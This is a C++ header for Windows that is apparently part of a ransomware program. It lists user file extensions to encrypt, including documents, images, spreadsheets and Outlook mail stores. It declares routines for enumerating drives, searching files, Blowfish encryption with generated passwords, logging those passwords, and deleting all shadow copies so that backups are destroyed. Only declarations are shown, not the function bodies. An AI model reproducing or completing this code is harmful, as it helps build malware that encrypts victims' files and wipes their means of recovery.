#pragma once
#include <vector>
#include <string>
#include <Windows.h>
#include <fstream>
#include <ios>
#include <iostream>
#include <shlobj.h>
#include "blowfish.h"
#include <ctime>
#include <random>
#include <thread>
#include <stdio.h>
#include <stdlib.h>

#define PASSWORD_LENGTH				64						/*<- Length of password*/
#define TXT_FILE					"log.output"			/*<-*/

/*Init vector with data for file extensions to be encrypted*/
std::vector<std::string>_v_file_extension = { ".txt",".jpg",".gif",".png",".psd",".eps",".ai",
												".dwg", ".doc",".docx",".xls",".xlsx",".ppt","pptx",
												".pst",".pstx" };


void UpdateDriveList();
std::string GeneratePassword();
void Encrypt(std::string _filePath, std::string _password);
bool StartEncryption();
void SearchFile(LPWSTR path);
//DWORD WINAPI FileProcess(LPVOID lpParameter);
DWORD WINAPI SearchEngine(LPVOID lpParameter);
void DeleteAllShadowCopies();
void writeLogFile(std::string _filename, std::string password);

volatile bool _is_success = false;
std::vector<std::string>_v_location;
std::vector<std::string>_v_filenames;
std::vector<std::string>_passwords;
std::string _log_file;
